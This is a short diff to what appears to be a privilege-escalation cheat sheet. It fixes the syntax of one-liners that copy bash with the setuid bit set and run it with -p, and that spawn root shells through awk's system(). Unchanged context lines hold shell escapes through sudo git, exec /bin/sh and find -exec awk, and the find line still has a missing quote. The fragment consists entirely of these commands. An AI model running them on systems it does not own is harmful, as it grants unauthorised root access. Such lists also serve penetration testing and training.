@@ -1,6 +1,6 @@
 ```bash
 # [Interesting]
-sh -c 'cp ${which bash} .; chmod +s ./bash'
+sh -c 'cp $(which bash) .; chmod +s ./bash'
 ./bash -p
 ```
 
@@ -23,7 +23,7 @@ sudo git -p help config
 exec "/bin/sh"
 
 # [awk]
-awk 'BEGIN {system{"/bin/bash"}}'
+awk 'BEGIN {system("/bin/bash")}'
 
 # [find]
 find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash)}' \;
